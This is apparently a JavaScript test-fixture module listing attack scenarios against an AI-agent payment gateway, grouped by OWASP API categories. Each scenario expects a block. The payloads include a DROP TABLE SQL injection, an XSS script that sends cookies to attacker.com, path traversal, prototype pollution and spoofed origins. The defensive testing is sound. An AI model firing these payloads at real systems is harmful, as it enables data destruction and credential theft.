export const OWASP_CATEGORIES = [
  { id: 'all', name: 'All Categories', description: 'Complete 29-test security suite', count: 29 },
  { id: 'bola', name: 'BOLA / IDOR', description: 'Broken Object Level Authorization & Account Isolation', count: 6 },
  { id: 'business_logic', name: 'Business Logic & Limits', description: 'Transaction Caps, Daily Budget & Arithmetic Edge Cases', count: 6 },
  { id: 'input_validation', name: 'Input Validation', description: 'Sanitization, Malformed Addresses & Injection Payloads', count: 6 },
  { id: 'origin_spoofing', name: 'Origin Spoofing', description: 'CORS, Rogue Agents & Network Header Tampering', count: 5 },
  { id: 'protocol_integrity', name: 'Protocol Integrity', description: 'Whitelist Enforcement, Signatures & Replay Prevention', count: 6 },
];

export const normalizeCategory = (cat) => {
  if (!cat) return '';
  const s = String(cat).toLowerCase().replace(/[\s\/\-_&]/g, '');
  if (s.includes('bola') || s.includes('idor')) return 'bola';
  if (s.includes('logic') || s.includes('limit')) return 'business_logic';
  if (s.includes('input') || s.includes('valid')) return 'input_validation';
  if (s.includes('origin') || s.includes('spoof') || s.includes('ssrf')) return 'origin_spoofing';
  if (s.includes('protocol') || s.includes('whitelist') || s.includes('replay') || s.includes('control')) return 'protocol_integrity';
  return s;
};

export const findScenario = (idOrIndex) => {
  if (typeof idOrIndex === 'number') {
    return ATTACK_SCENARIOS[idOrIndex];
  }
  if (!idOrIndex) return null;
  const target = String(idOrIndex).toLowerCase().replace(/[^a-z0-9]/g, '');
  return ATTACK_SCENARIOS.find(s => {
    const sId = s.id.toLowerCase().replace(/[^a-z0-9]/g, '');
    if (sId === target) return true;
    if (s.aliasIds && s.aliasIds.some(a => a.toLowerCase().replace(/[^a-z0-9]/g, '') === target)) return true;
    return false;
  }) || null;
};

export const ATTACK_SCENARIOS = [
  // Category 1: BOLA / IDOR (6 vectors)
  {
    id: 'bola-01',
    name: 'Cross-Tenant Account Drainage',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API1:2023 - Broken Object Level Authorization',
    description: 'Agent attempts to trigger debit from victim account ID act_victim_4401 without authorization context.',
    payload: {
      account_id: 'act_victim_4401',
      recipient: '0xAttacker...DeadBeef',
      amount: 45.00,
      currency: 'USD',
      origin: 'https://payfence.internal',
      timestamp: Date.now()
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-BOLA-01: Account ownership assertion failed. Target account does not match authenticated agent context.'
  },
  {
    id: 'bola-02',
    name: 'Wallet Session Hijack Attempt',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API1:2023 - Broken Object Level Authorization',
    description: 'Replaying expired session token with changed destination address.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x999...BEEF',
      amount: 25.00,
      currency: 'USD',
      session_token: 'sess_stale_expired_token_882',
      timestamp: Date.now() - 400000
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-BOLA-02: Stale session token detected. Replay protection threshold triggered (>300s window).'
  },
  {
    id: 'bola-03',
    name: 'Sub-Account Scope Escalation',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API5:2023 - Broken Function Level Authorization',
    description: 'Restricted read-only sub-agent attempting payment execution.',
    payload: {
      account_id: 'act_readonly_sub3',
      recipient: '0x71C...8942',
      amount: 10.00,
      currency: 'USD',
      scope: 'read_telemetry',
      origin: 'https://payfence.internal'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-AUTH-03: Insufficient agent permission scope. Required: "payments:execute", Provided: "read_telemetry".'
  },
  {
    id: 'bola-04',
    name: 'Tenant Boundary Traversal',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API1:2023 - Broken Object Level Authorization',
    description: 'Path manipulation in account identifier attempting directory or tenant escape (../../admin).',
    payload: {
      account_id: '../../admin/treasury',
      recipient: '0x71C...8942',
      amount: 50.00,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-VAL-04: Malformed account identifier. Path traversal characters prohibited.'
  },
  {
    id: 'bola-05',
    name: 'Tampered Body User Identity',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API1:2023 - Broken Object Level Authorization',
    description: 'Mismatched JWT claim identity vs payload body user_id.',
    payload: {
      account_id: 'act_live_9921',
      override_user_id: 'usr_root_system_0',
      recipient: '0x71C...8942',
      amount: 30.00,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-BOLA-05: Identity spoofing detected. Body parameter override_user_id conflicts with validated token.'
  },
  {
    id: 'bola-06',
    name: 'Forged Cryptographic Proof',
    category: 'bola',
    categoryName: 'BOLA / IDOR',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API2:2023 - Broken Authentication',
    description: 'Fake zero-knowledge signature submitted to bypass ownership check.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 15.00,
      currency: 'USD',
      proof: 'zk_fake_sig_404_invalid_curve_point'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-SIG-06: Cryptographic proof verification failed. Invalid ECDSA/Ed25519 signature curve point.'
  },

  // Category 2: Business Logic & Limits (6 vectors)
  {
    id: 'logic-01',
    name: 'Excessive Transaction Cap ($750)',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
    description: 'Autonomous payment request exceeding hard per-transaction limit of $50.00.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 750.00,
      currency: 'USD',
      origin: 'https://payfence.internal'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-CAP-01: Amount $750.00 exceeds configured hard per-transaction cap ($50.00).'
  },
  {
    id: 'logic-02',
    name: 'Negative Value Reverse Debit',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API4:2023 - Business Logic Violation',
    description: 'Negative amount submitted (-$100.00) to invert ledger transaction and siphon funds.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: -100.00,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-MATH-02: Amount must be strictly positive (> 0.00). Negative values prohibited.'
  },
  {
    id: 'logic-03',
    name: 'Zero-Value Drain Attack',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'MEDIUM',
    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
    description: 'Zero amount transfer attempting to trigger unmetered backend gas/compute fee consumption.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 0.00,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-MATH-03: Zero-value transactions rejected. Minimum allowable payment is $0.01.'
  },
  {
    id: 'logic-04',
    name: 'Daily Budget Overflow ($200 Cap)',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
    description: 'Transaction within per-tx cap but exceeds cumulative 24h rolling budget threshold.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 49.00,
      cumulative_today: 195.00,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-BUDGET-04: Daily rolling budget exceeded. Spent: $195.00, Requested: $49.00, Daily Cap: $200.00.'
  },
  {
    id: 'logic-05',
    name: 'IEEE-754 Micro-Dusting Exploit',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'MEDIUM',
    owaspCode: 'API4:2023 - Business Logic Flaw',
    description: 'Floating point precision exploitation with sub-cent fraction (0.00000000001).',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 0.00000000001,
      currency: 'USD'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-PRECISION-05: Precision limit violation. Maximum 2 decimal places permitted for standard fiat/USDC.'
  },
  {
    id: 'logic-06',
    name: 'Rapid Double-Spending Race Burst',
    category: 'business_logic',
    categoryName: 'Business Logic & Limits',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API6:2023 - Unrestricted Resource Consumption',
    description: 'Concurrent duplicate transaction nonces fired within 10ms window.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 40.00,
      nonce: 10442,
      replay_id: 'dup_race_tx_001'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #LIM-CONCURRENCY-06: Nonce reuse detected. Duplicate sequence number 10442 already processed.'
  },

  // Category 3: Input Validation (6 vectors)
  {
    id: 'input-01',
    aliasIds: ['val-01', 'input-01'],
    name: 'SQL / NoSQL Injection in Memo',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API8:2023 - Security Misconfiguration / Injection',
    description: 'SQL statement injection within transaction memo string.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 15.00,
      memo: "'; DROP TABLE audit_logs; --"
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-INJECT-01: Disallowed SQL control characters detected in memo parameter.'
  },
  {
    id: 'input-02',
    aliasIds: ['val-02', 'input-02'],
    name: 'Stored XSS Payload in Metadata',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API8:2023 - Injection',
    description: 'Cross-site scripting vector inside billing description.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 10.00,
      memo: '<script>fetch("https://attacker.com/steal?"+document.cookie)</script>'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-XSS-02: HTML/Script tags detected in text field. Input rejected by sanitization gate.'
  },
  {
    id: 'input-03',
    aliasIds: ['val-03', 'input-03'],
    name: 'Type Mismatch String-As-Amount',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'MEDIUM',
    owaspCode: 'API3:2023 - Broken Object Property Level Authorization',
    description: 'Passing string representation containing logical tautology instead of number.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: '50.00 OR 1=1'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-TYPE-03: Strict type validation failed. Amount must be a valid positive float/integer.'
  },
  {
    id: 'input-04',
    aliasIds: ['val-04', 'input-04'],
    name: 'Malformed Recipient Address Checksum',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
    description: 'Corrupted Ethereum/Solana wallet address with invalid hex character and length.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0xZZZZ_invalid_hex_string_398',
      amount: 20.00
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-ADDR-04: Recipient address format invalid. Must match valid hexadecimal EVM address regex.'
  },
  {
    id: 'input-05',
    aliasIds: ['val-05', 'input-05'],
    name: 'Integer Overflow Simulation (> MAX_SAFE)',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API4:2023 - Unrestricted Resource Consumption',
    description: 'Number exceeding JavaScript MAX_SAFE_INTEGER (9007199254740992).',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 9007199254740999
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-OVERFLOW-05: Numerical boundary exceeded. Amount exceeds IEEE 754 safe integer limits.'
  },
  {
    id: 'input-06',
    aliasIds: ['val-06', 'input-06'],
    name: 'Prototype Pollution Injection (__proto__)',
    category: 'input_validation',
    categoryName: 'Input Validation',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API8:2023 - Security Misconfiguration',
    description: 'Object payload containing prototype pollution key __proto__.isAdmin.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 15.00,
      __proto__: { isAdmin: true }
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #VAL-PROTO-06: Hazardous object property __proto__ or constructor detected in payload.'
  },

  // Category 4: Origin Spoofing & Network (5 vectors)
  {
    id: 'origin-01',
    name: 'Rogue External Origin Domain',
    category: 'origin_spoofing',
    categoryName: 'Origin Spoofing',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API7:2023 - Server Side Request Forgery / Origin Bypass',
    description: 'Request originated from untrusted domain evil-agent-bot.xyz.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 25.00,
      origin: 'https://evil-agent-bot.xyz'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #NET-CORS-01: Origin https://evil-agent-bot.xyz not in approved gateway whitelist.'
  },
  {
    id: 'origin-02',
    name: 'Missing Origin Header (Headless Bot)',
    category: 'origin_spoofing',
    categoryName: 'Origin Spoofing',
    type: 'attack',
    severity: 'MEDIUM',
    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
    description: 'Raw curl/socket call with stripped Origin and Referer headers.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 10.00,
      origin: null
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #NET-HDR-02: Mandatory origin verification header missing from payment request.'
  },
  {
    id: 'origin-03',
    name: 'Subdomain Prefix Phishing Spoof',
    category: 'origin_spoofing',
    categoryName: 'Origin Spoofing',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API7:2023 - Server Side Request Forgery',
    description: 'Attacker hosted domain mimics official host (payfence.internal.attacker.cc).',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 20.00,
      origin: 'https://payfence.internal.attacker.cc'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #NET-CORS-03: Subdomain wildcard bypass rejected. Strict origin match required.'
  },
  {
    id: 'origin-04',
    name: 'Null Origin Sandbox Escape',
    category: 'origin_spoofing',
    categoryName: 'Origin Spoofing',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API7:2023 - Origin Misconfiguration',
    description: 'Browser iframe sandbox escape sending Origin: "null".',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 12.00,
      origin: 'null'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #NET-HDR-04: Opaque / "null" origin rejected. Request must originate from authenticated perimeter.'
  },
  {
    id: 'origin-05',
    name: 'Spoofed Localhost Loopback',
    category: 'origin_spoofing',
    categoryName: 'Origin Spoofing',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API7:2023 - SSRF',
    description: 'X-Forwarded-For claiming 127.0.0.1 from external public IP.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 35.00,
      origin: 'http://localhost:5000',
      client_ip: '198.51.100.44'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #NET-IP-05: Proxy header spoofing detected. IP 198.51.100.44 does not match localhost loopback.'
  },

  // Category 5: Protocol Integrity & Whitelisting (5 vectors)
  {
    id: 'proto-01',
    name: 'Unwhitelisted External Recipient',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
    description: 'Recipient account is not present in approved merchant whitelist.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0xDarkPool_9918a0e_Unverified',
      amount: 18.00,
      currency: 'USD',
      origin: 'https://payfence.internal'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #WL-RECIP-01: Recipient address 0xDarkPool_9918a0e_Unverified is not on the approved whitelist.'
  },
  {
    id: 'proto-02',
    name: 'Missing HMAC Request Signature',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API2:2023 - Broken Authentication',
    description: 'Payload lacks required cryptographic signature header (x-payfence-signature).',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 15.00,
      signature: null
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-SIG-02: Cryptographic signature required. Missing x-payfence-signature header.'
  },
  {
    id: 'proto-03',
    name: 'Clock Skew Replay Attack (> 300s)',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'attack',
    severity: 'HIGH',
    owaspCode: 'API8:2023 - Lack of Protection from Automated Threats',
    description: 'Timestamp is 12 minutes in the past, triggering anti-replay gate.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 22.00,
      timestamp: Date.now() - (720 * 1000)
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-TIME-03: Request timestamp delta exceeds tolerance (720s > max allowable 300s).'
  },
  {
    id: 'proto-04',
    name: 'Payload Hash Mismatch (In-Flight Tamper)',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'attack',
    severity: 'CRITICAL',
    owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
    description: 'Content digest does not match SHA-256 hash calculated over body.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 49.99,
      sha256_digest: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-HASH-04: Body hash mismatch. Payload was modified in transit after signing.'
  },
  {
    id: 'proto-05',
    name: 'Unsupported Spoofed Asset Symbol',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'attack',
    severity: 'MEDIUM',
    owaspCode: 'API10:2023 - Unsafe Consumption of APIs',
    description: 'Injecting bogus currency token symbol ("SHIB-SCAM") not supported by gateway.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C...8942',
      amount: 20.00,
      currency: 'SHIB-SCAM'
    },
    expectedStatus: 403,
    expectedAction: 'BLOCKED',
    policyRule: 'Policy #SEC-CURR-05: Unsupported asset type "SHIB-SCAM". Only verified currencies (USD, USDC) permitted.'
  },

  // 6. Legitimate Control Benchmark (1 control vector)
  {
    id: 'ctrl-01',
    aliasIds: ['control-01', 'ctrl-01'],
    name: 'Legitimate Whitelisted Autonomous Payment (Control)',
    category: 'protocol_integrity',
    categoryName: 'Protocol Integrity & Whitelist',
    type: 'legitimate',
    severity: 'LOW',
    owaspCode: 'API10:2023 - Control Benchmark',
    description: 'Standard authorized autonomous micro-payment under $50.00 to a whitelisted recipient with authentic origin.',
    payload: {
      account_id: 'act_live_9921',
      recipient: '0x71C8451C3343344Fc4534664634234567890abcd',
      amount: 12.50,
      currency: 'USD',
      origin: 'https://app.payfence.io',
      userId: 'usr_demo_01',
      memo: 'Inference token subscription batch #41',
      timestamp: Date.now()
    },
    expectedStatus: 200,
    expectedAction: 'APPROVED',
    policyRule: 'Policy #P-101: Transaction permitted under $50.00 cap, whitelisted vendor, valid origin, budget available.'
  }
];
